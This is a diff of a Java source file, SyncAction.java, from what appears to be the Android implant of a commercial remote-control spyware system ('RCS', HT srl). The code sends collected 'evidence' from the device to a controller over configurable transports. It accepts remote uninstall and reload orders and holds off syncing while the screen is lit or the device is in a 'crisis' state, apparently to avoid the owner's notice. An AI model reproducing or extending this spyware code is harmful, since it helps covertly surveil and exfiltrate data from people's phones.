@@ -1,131 +1,151 @@
+/* *******************************************
+ * Copyright (c) 2011
+ * HT srl,   All rights reserved.
+ * Project      : RCS, RCSAndroid
+ * File         : SyncAction.java
+ * Created      : Apr 9, 2011
+ * Author		: zeno
+ * *******************************************/
 package com.ht.RCSAndroidGUI.action;
 
 import java.util.Vector;
 
+import android.util.Log;
+
 import com.ht.RCSAndroidGUI.Debug;
-import com.ht.RCSAndroidGUI.Evidence;
-import com.ht.RCSAndroidGUI.EvidenceCollector;
 import com.ht.RCSAndroidGUI.action.sync.Protocol;
 import com.ht.RCSAndroidGUI.action.sync.ProtocolException;
 import com.ht.RCSAndroidGUI.action.sync.Transport;
 import com.ht.RCSAndroidGUI.action.sync.ZProtocol;
-import com.ht.RCSAndroidGUI.agent.Agent;
+import com.ht.RCSAndroidGUI.agent.AgentConf;
 import com.ht.RCSAndroidGUI.agent.AgentManager;
-import com.ht.RCSAndroidGUI.event.Event;
+import com.ht.RCSAndroidGUI.evidence.Evidence;
+import com.ht.RCSAndroidGUI.evidence.EvidenceCollector;
 import com.ht.RCSAndroidGUI.utils.Check;
 
+// TODO: Auto-generated Javadoc
+/**
+ * The Class SyncAction.
+ */
 public abstract class SyncAction extends SubAction {
-    protected EvidenceCollector logCollector;
-    protected AgentManager agentManager;
-    // protected Transport[] transports = new Transport[Transport.NUM];
-    protected Vector transports;
-    protected Protocol protocol;
 
-    protected boolean initialized;
+	private static final String TAG = "SyncAction";
 
-    //#ifdef DEBUG
-    protected static Debug debug = new Debug("SyncAction");
-    //#endif
+	/** The log collector. */
+	protected EvidenceCollector logCollector;
 
-    public SyncAction(int actionId, final byte[] confParams) {
-        super(actionId, confParams);
+	/** The agent manager. */
+	protected AgentManager agentManager;
+	// protected Transport[] transports = new Transport[Transport.NUM];
+	/** The transports. */
+	protected Vector transports;
 
-        logCollector = EvidenceCollector.self();
-        agentManager = AgentManager.self();
-        transports = new Vector();
+	/** The protocol. */
+	protected Protocol protocol;
 
-        protocol = new ZProtocol();
-        initialized = parse(confParams);
-        initialized &= initTransport();
-    }
+	/** The initialized. */
+	protected boolean initialized;
+	/** The debug. */
+	protected static Debug debug = new Debug("SyncAction");
+	/**
+	 * Instantiates a new sync action.
+	 * 
+	 * @param actionId
+	 *            the action id
+	 * @param confParams
+	 *            the conf params
+	 */
+	public SyncAction(final int actionId, final byte[] confParams) {
+		super(actionId, confParams);
 
-    public boolean execute() {
-        //#ifdef DBC
-        Check.requires(protocol != null, "execute: null protocol");
-        Check.requires(transports != null, "execute: null transports");
-        //#endif
+		logCollector = EvidenceCollector.self();
+		agentManager = AgentManager.self();
+		transports = new Vector();
 
-        if (status.synced == true) {
-            //#ifdef DEBUG
-            debug.warn("Already synced in this action: skipping");
-            //#endif
-            return false;
-        }
+		protocol = new ZProtocol();
+		initialized = parse(confParams);
+		initialized &= initTransport();
+	}
 
-        if (status.crisisSync()) {
-            //#ifdef DEBUG
-            debug.warn("SyncAction - no sync, we are in crisis");
-            //#endif
-            return false;
-        }
+	/*
+	 * (non-Javadoc)
+	 * 
+	 * @see com.ht.RCSAndroidGUI.action.SubAction#execute()
+	 */
+	@Override
+	public boolean execute() {
+		Check.requires(protocol != null, "execute: null protocol");
+		Check.requires(transports != null, "execute: null transports");
+		if (status.synced == true) {
+			Log.d(TAG,"Warn: " +"Already synced in this action: skipping");
+			return false;
+		}
 
-        //#ifndef DEBUG
-        if (status.backlight()) {
-            return false;
-        }
-        //#endif
+		if (status.crisisSync()) {
+			Log.d(TAG,"Warn: " +"SyncAction - no sync, we are in crisis");
+			return false;
+		}
 
-        wantReload = false;
-        wantUninstall = false;
+		// #ifndef DEBUG
+		if (status.backlight()) {
+			return false;
+		}
+		wantReload = false;
+		wantUninstall = false;
 
-        agentManager.reloadAgent(Agent.AGENT_DEVICE);
+		agentManager.reload(AgentConf.AGENT_DEVICE);
 
-        boolean ret = false;
+		boolean ret = false;
 
-        for (int i = 0; i < transports.size(); i++) {
-            Transport transport = (Transport) transports.elementAt(i);
+		for (int i = 0; i < transports.size(); i++) {
+			final Transport transport = (Transport) transports.elementAt(i);
+			Log.d(TAG,"execute transport: " + transport);
+			Log.d(TAG,"transport Sync url: " + transport.getUrl());
+			
+			if (transport.isAvailable()) {
+				Log.d(TAG,"execute: transport available");
+				protocol.init(transport);
 
-            //#ifdef DEBUG
-            debug.trace("execute transport: " + transport);
-            debug.trace("transport Sync url: " + transport.getUrl());
-            //#endif                       
+				try {
+					ret = protocol.perform();
+					wantUninstall = protocol.uninstall;
+					wantReload = protocol.reload;
+				} catch (final ProtocolException e) {
+					Log.d(TAG,"Error: " +e.toString());
+					ret = false;
+				}
+				
+				Log.d(TAG,"execute protocol: " + ret);
+			} else {
+				Log.d(TAG,"execute: transport not available");
+			}
 
-            if (transport.isAvailable()) {
-                //#ifdef DEBUG
-                debug.trace("execute: transport available");
-                //#endif
-                protocol.init(transport);
+			if (ret) {
+				Log.d(TAG,"Info: SyncAction OK");
+				Evidence.info("Synced with url:" + transport.getUrl());
+				status.synced = true;
+				return true;
+			}
+			
+			Log.d(TAG,"Error: SyncAction Unable to perform");
+		}
 
-                try {
-                    ret = protocol.perform();
-                    wantUninstall = protocol.uninstall;
-                    wantReload = protocol.reload;
-                } catch (ProtocolException e) {
-                    //#ifdef DEBUG
-                    debug.error(e);
-                    //#endif
-                    ret = false;
-                } 
-                //#ifdef DEBUG
-                debug.trace("execute protocol: " + ret);
-                //#endif
+		return false;
+	}
 
-            } else {
-                //#ifdef DEBUG
-                debug.trace("execute: transport not available");
-                //#endif
-            }
+	/**
+	 * Parses the.
+	 * 
+	 * @param confParams
+	 *            the conf params
+	 * @return true, if successful
+	 */
+	protected abstract boolean parse(final byte[] confParams);
 
-            if (ret) {
-                //#ifdef DEBUG
-                debug.info("SyncAction OK");
-                Evidence.info("Synced with url:" + transport.getUrl());
-                //#endif
-
-                status.synced = true;
-                return true;
-            }
-
-            //#ifdef DEBUG
-            debug.error("SyncAction Unable to perform");
-            //#endif
-
-        }
-
-        return false;
-    }
-
-    protected abstract boolean parse(final byte[] confParams);
-
-    protected abstract boolean initTransport();
+	/**
+	 * Inits the transport.
+	 * 
+	 * @return true, if successful
+	 */
+	protected abstract boolean initTransport();
 }
